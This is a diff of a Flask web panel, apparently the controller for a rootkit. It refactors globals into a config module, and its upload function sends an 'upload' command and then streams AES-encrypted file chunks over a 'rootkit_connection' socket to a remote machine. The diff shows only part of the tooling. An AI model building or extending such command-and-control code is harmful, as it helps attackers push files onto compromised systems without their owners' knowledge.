@@ -1,8 +1,16 @@
+from app import app
+import config as cfg
+from flask import flash, render_template, redirect, url_for, request
+from utils.aes import aes_encrypt
+import os
+from utils.socket import send_to_server
+from werkzeug.utils import secure_filename
+
 # ---------------------------------- UPLOAD ---------------------------------- #
 
 @app.route('/upload', methods=['GET', 'POST'])
 def upload():
-    if not authenticated:
+    if not cfg.authenticated:
         return redirect(url_for('login'))
 
     if request.method == 'POST':
@@ -30,7 +38,7 @@ def upload_file_encrypted(local_path, remote_path):
 
     try:
         # Envoi de la commande upload + chemin destination
-        send_to_server(rootkit_connection, f"upload {remote_path}")
+        send_to_server(cfg.rootkit_connection, f"upload {remote_path}")
 
         # Envoi du fichier chiffré par blocs
         with open(local_path, "rb") as f:
@@ -39,10 +47,10 @@ def upload_file_encrypted(local_path, remote_path):
                 if not chunk:
                     break
                 encrypted = aes_encrypt(chunk)
-                rootkit_connection.sendall(encrypted)
+                cfg.rootkit_connection.sendall(encrypted)
 
         # Marqueur de fin
-        rootkit_connection.sendall(b"EOF\n")
+        cfg.rootkit_connection.sendall(b"EOF\n")
 
         print(f"[+] Fichier '{local_path}' envoyé avec succès vers '{remote_path}'.")
 
